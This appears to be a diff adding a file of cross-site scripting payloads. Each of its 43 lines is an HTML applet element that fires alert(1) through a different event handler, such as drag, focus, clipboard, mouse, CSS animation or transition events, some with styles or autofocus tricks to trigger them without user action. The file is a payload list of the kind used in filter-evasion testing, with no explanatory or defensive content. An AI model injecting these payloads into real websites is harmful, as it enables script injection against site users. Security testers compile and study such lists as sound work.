@@ -1,0 +1,43 @@
+<applet draggable="true" ondrag="alert(1)">test</applet>
+<applet draggable="true" ondragend="alert(1)">test</applet>
+<applet draggable="true" ondragenter="alert(1)">test</applet>
+<applet draggable="true" ondragleave="alert(1)">test</applet>
+<applet draggable="true" ondragstart="alert(1)">test</applet>
+<applet id=x tabindex=1 onactivate=alert(1)></applet>
+<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
+<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
+<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
+<applet id=x tabindex=1 onfocus=alert(1)></applet>
+<applet id=x tabindex=1 onfocusin=alert(1)></applet>
+<applet onbeforecopy="alert(1)" contenteditable>test</applet>
+<applet onbeforecut="alert(1)" contenteditable>test</applet>
+<applet onbeforepaste="alert(1)" contenteditable>test</applet>
+<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
+<applet onclick="alert(1)">test</applet>
+<applet oncontextmenu="alert(1)">test</applet>
+<applet oncopy="alert(1)" contenteditable>test</applet>
+<applet oncut="alert(1)" contenteditable>test</applet>
+<applet ondblclick="alert(1)">test</applet>
+<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
+<applet onkeydown="alert(1)" contenteditable>test</applet>
+<applet onkeypress="alert(1)" contenteditable>test</applet>
+<applet onkeyup="alert(1)" contenteditable>test</applet>
+<applet onmousedown="alert(1)">test</applet>
+<applet onmouseenter="alert(1)">test</applet>
+<applet onmouseleave="alert(1)">test</applet>
+<applet onmousemove="alert(1)">test</applet>
+<applet onmouseout="alert(1)">test</applet>
+<applet onmouseover="alert(1)">test</applet>
+<applet onmouseup="alert(1)">test</applet>
+<applet onpaste="alert(1)" contenteditable>test</applet>
+<applet onreadystatechange=alert(1)></applet>
+<div draggable="true" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>
+<div draggable="true" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>
+<style>:target {color: red;}</style><applet id=x style="transition:color 10s" ontransitioncancel=alert(1)></applet>
+<style>:target {color:red;}</style><applet id=x style="transition:color 1s" ontransitionend=alert(1)></applet>
+<style>:target {transform: rotate(180deg);}</style><applet id=x style="transition:transform 2s" ontransitionrun=alert(1)></applet>
+<style>@keyframes slidein {}</style><applet style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></applet>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style="position:absolute;" onanimationcancel="alert(1)"></applet>
+<style>@keyframes x{}</style><applet style="animation-name:x" onanimationend="alert(1)"></applet>
+<style>@keyframes x{}</style><applet style="animation-name:x" onanimationstart="alert(1)"></applet>
+<svg><applet onload=alert(1)></applet>
